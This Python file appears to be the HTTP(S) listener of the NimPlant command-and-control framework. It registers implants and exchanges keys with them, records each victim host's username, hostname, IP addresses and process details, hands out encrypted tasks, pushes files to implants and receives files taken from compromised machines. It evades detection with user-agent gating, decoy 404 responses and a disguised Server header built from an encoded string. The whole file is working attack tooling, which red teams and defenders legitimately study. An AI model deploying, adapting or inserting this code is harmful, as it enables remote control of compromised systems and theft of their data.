from .config import config
from .crypto import *
from .func import *
from .nimplant import *
from .notify import notify_user
from gevent.pywsgi import WSGIServer
from zlib import decompress, compress
import base64
import flask
import gzip
import hashlib
import io
import json

# Parse configuration from 'config.toml'
try:
    listenerType = config["listener"]["type"]
    listenerIp = config["listener"]["ip"]
    listenerPort = config["listener"]["port"]
    registerPath = config["listener"]["registerPath"]
    taskPath = config["listener"]["taskPath"]
    resultPath = config["listener"]["resultPath"]
    userAgent = config["nimplant"]["userAgent"]
    if listenerType == "HTTPS":
        sslCertPath = config["listener"]["sslCertPath"]
        sslKeyPath = config["listener"]["sslKeyPath"]
    b_ident = b"789CF3CBCC0DC849CC2B51703652084E2D2A4B2D02003B5C0650"
except KeyError as e:
    nimplantPrint(
        f"ERROR: Could not load configuration, check your 'config.toml': {str(e)}"
    )
    os._exit(1)

# Init flask app and surpress Flask/Gevent logging and startup messages
app = flask.Flask(__name__)
ident = decompress(base64.b16decode(b_ident)).decode("utf-8")

# Define a function to notify users of unknown or erroneous requests
def notifyBadRequest(src, method, path, user_agent, reason=None):
    if reason == "badkey":
        nimplantPrint(
            f"Rejected malformed {method} request. This is likely caused by a XOR key mismatch between NimPlant and server! "
            f"Request from '{src}': {path} ({user_agent})."
        )
    else:
        nimplantPrint(f"Rejected {method} request from '{src}': {path} ({user_agent})")


# Define Flask listener to run in thread
def flaskListener(xor_key):
    @app.route(registerPath, methods=["GET", "POST"])
    # Verify expected user-agent for incoming registrations
    def getNimPlant():
        if userAgent == flask.request.headers.get("User-Agent"):
            # First request from NimPlant (GET, no data) -> Initiate NimPlant and return XORed key
            if flask.request.method == "GET":
                np = NimPlant()
                np_server.add(np)
                xor_bytes = xorString(np.cryptKey, xor_key)
                encodedKey = base64.b64encode(xor_bytes).decode("utf-8")
                return flask.jsonify(id=np.guid, k=encodedKey), 200

            # Second request from NimPlant (POST, encrypted blob) -> Activate the NimPlant object based on encrypted data
            elif flask.request.method == "POST":
                data = flask.request.json
                np = np_server.getNimplantByGuid(
                    flask.request.headers.get("X-Identifier")
                )
                data = data["data"]

                try:
                    data = decryptData(data, np.cryptKey)
                    dataJson = json.loads(data)
                    ipAddrInt = dataJson["i"]
                    ipAddrExt = flask.request.remote_addr
                    username = dataJson["u"]
                    hostname = dataJson["h"]
                    osBuild = dataJson["o"]
                    pid = dataJson["p"]
                    pname = dataJson["P"]
                    riskyMode = dataJson["r"]

                    np.activate(
                        ipAddrExt,
                        ipAddrInt,
                        username,
                        hostname,
                        osBuild,
                        pid,
                        pname,
                        riskyMode,
                    )

                    notify_user(np)

                    if not np_server.containsActiveNimplants():
                        np_server.selectNimplant(np.guid)

                    return flask.jsonify(status="OK"), 200

                except:
                    notifyBadRequest(
                        flask.request.remote_addr,
                        flask.request.method,
                        flask.request.path,
                        flask.request.headers.get("User-Agent"),
                        "badkey",
                    )
                    return flask.jsonify(status="Not found"), 404
        else:
            notifyBadRequest(
                flask.request.remote_addr,
                flask.request.method,
                flask.request.path,
                flask.request.headers.get("User-Agent"),
            )
            return flask.jsonify(status="Not found"), 404

    @app.route(taskPath, methods=["GET"])
    # Return the first active task IF the user-agent is as expected
    def getTask():
        np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
        if np is not None:
            if userAgent == flask.request.headers.get("User-Agent"):
                # Update the external IP address if it changed
                if not np.ipAddrExt == flask.request.remote_addr:
                    np.ipAddrExt = flask.request.remote_addr

                if np.pendingTasks:
                    # There is a task - check in to update 'last seen' and return the task
                    np.checkIn()
                    task = encryptData(str(np.getNextTask()), np.cryptKey)
                    return flask.jsonify(t=task), 200
                else:
                    # There is no task - check in to update 'last seen'
                    if np.isActive():
                        np.checkIn()
                    return flask.jsonify(status="OK"), 200
            else:
                notifyBadRequest(
                    flask.request.remote_addr,
                    flask.request.method,
                    flask.request.path,
                    flask.request.headers.get("User-Agent"),
                )
                return flask.jsonify(status="Not found"), 404
        else:
            notifyBadRequest(
                flask.request.remote_addr,
                flask.request.method,
                flask.request.path,
                flask.request.headers.get("User-Agent"),
            )
            return flask.jsonify(status="Not found"), 404

    @app.route(taskPath + "/<fileId>", methods=["GET"])
    # Return a hosted file as gzip-compressed stream for the 'upload' command,
    # IF the user-agent is as expected AND the caller knows the file ID
    def uploadFile(fileId):
        np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
        if np is not None:
            if userAgent == flask.request.headers.get("User-Agent"):
                if (np.hostingFile != None) and (
                    fileId == hashlib.md5(np.hostingFile.encode("utf-8")).hexdigest()
                ):
                    try:
                        # Construct a GZIP stream of the file to upload in-memory
                        # Note: We 'double-compress' here since compression has little use after encryption,
                        #       but we want to present the file as a GZIP stream anyway
                        taskGuid = flask.request.headers.get("X-Unique-ID")
                        with open(np.hostingFile, mode="rb") as contents:
                            processedFile = encryptData(
                                compress(contents.read()), np.cryptKey
                            )

                        with io.BytesIO() as data:
                            with gzip.GzipFile(fileobj=data, mode="wb") as zip:
                                zip.write(processedFile.encode("utf-8"))
                            gzippedResult = data.getvalue()

                        np.stopHostingFile()

                        # Return the GZIP stream as a response
                        res = flask.make_response(gzippedResult)
                        res.mimetype = "application/x-gzip"
                        res.headers["Content-Encoding"] = "gzip"
                        return res

                    except Exception as e:
                        # Error: Could not host the file
                        nimplantPrint(
                            f"An error occurred while uploading file:\n{type(e)}:{e}",
                            np.guid,
                            taskGuid=taskGuid,
                        )
                        np.stopHostingFile()
                        return flask.jsonify(status="Not found"), 404
                else:
                    # Error: The Nimplant is not hosting a file or the file ID is incorrect
                    return flask.jsonify(status="OK"), 200
            else:
                # Error: The user-agent is incorrect
                notifyBadRequest(
                    flask.request.remote_addr,
                    flask.request.method,
                    flask.request.path,
                    flask.request.headers.get("User-Agent"),
                )
                return flask.jsonify(status="Not found"), 404
        else:
            # Error: No Nimplant with the given GUID is currently active
            notifyBadRequest(
                flask.request.remote_addr,
                flask.request.method,
                flask.request.path,
                flask.request.headers.get("User-Agent"),
            )
            return flask.jsonify(status="Not found"), 404

    @app.route(taskPath + "/u", methods=["POST"])
    # Receive a file downloaded from NimPlant through the 'download' command, IF the user-agent is as expected AND the NimPlant object is expecting a file
    def downloadFile():
        np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
        if np is not None:
            if userAgent == flask.request.headers.get("User-Agent"):
                if np.receivingFile != None:
                    try:
                        taskGuid = flask.request.headers.get("X-Unique-ID")
                        uncompressed_file = gzip.decompress(
                            decryptBinaryData(flask.request.data, np.cryptKey)
                        )
                        with open(np.receivingFile, "wb") as f:
                            f.write(uncompressed_file)
                        nimplantPrint(
                            f"Successfully downloaded file to '{os.path.abspath(np.receivingFile)}' on NimPlant server.",
                            np.guid,
                            taskGuid=taskGuid,
                        )

                        np.stopReceivingFile()
                        return flask.jsonify(status="OK"), 200
                    except Exception as e:
                        nimplantPrint(
                            f"An error occurred while downloading file: {e}",
                            np.guid,
                            taskGuid=taskGuid,
                        )
                        np.stopReceivingFile()
                        return flask.jsonify(status="Not found"), 404
                else:
                    return flask.jsonify(status="OK"), 200
            else:
                notifyBadRequest(
                    flask.request.remote_addr,
                    flask.request.method,
                    flask.request.path,
                    flask.request.headers.get("User-Agent"),
                )
                return flask.jsonify(status="Not found"), 404
        else:
            notifyBadRequest(
                flask.request.remote_addr,
                flask.request.method,
                flask.request.path,
                flask.request.headers.get("User-Agent"),
            )
            return flask.jsonify(status="Not found"), 404

    @app.route(resultPath, methods=["POST"])
    # Parse command output IF the user-agent is as expected
    def getResult():
        data = flask.request.json
        np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
        if np is not None:
            if userAgent == flask.request.headers.get("User-Agent"):
                res = json.loads(decryptData(data["data"], np.cryptKey))
                np.setTaskResult(
                    res["guid"], base64.b64decode(res["result"]).decode("utf-8")
                )
                return flask.jsonify(status="OK"), 200
            else:
                notifyBadRequest(
                    flask.request.remote_addr,
                    flask.request.method,
                    flask.request.path,
                    flask.request.headers.get("User-Agent"),
                )
                return flask.jsonify(status="Not found"), 404
        else:
            notifyBadRequest(
                flask.request.remote_addr,
                flask.request.method,
                flask.request.path,
                flask.request.headers.get("User-Agent"),
            )
            return flask.jsonify(status="Not found"), 404

    @app.errorhandler(Exception)
    def all_exception_handler(error):
        nimplantPrint(
            f"Rejected {flask.request.method} request from '{flask.request.remote_addr}' to {flask.request.path} due to error: {error}"
        )
        return flask.jsonify(status="Not found"), 404

    @app.after_request
    def changeserver(response):
        response.headers["Server"] = ident
        return response

    # Run the Flask web server using Gevent
    if listenerType == "HTTP":
        try:
            http_server = WSGIServer((listenerIp, listenerPort), app, log=None)
            http_server.serve_forever()
        except Exception as e:
            nimplantPrint(
                f"ERROR: Error setting up web server. Verify listener settings in 'config.toml'. Exception: {e}"
            )
            os._exit(1)
    else:
        try:
            https_server = WSGIServer(
                (listenerIp, listenerPort),
                app,
                keyfile=sslKeyPath,
                certfile=sslCertPath,
                log=None,
            )
            https_server.serve_forever()
        except Exception as e:
            nimplantPrint(
                f"ERROR: Error setting up SSL web server. Verify 'sslCertPath', 'sslKeyPath', and listener settings in 'config.toml'. Exception: {e}"
            )
            os._exit(1)
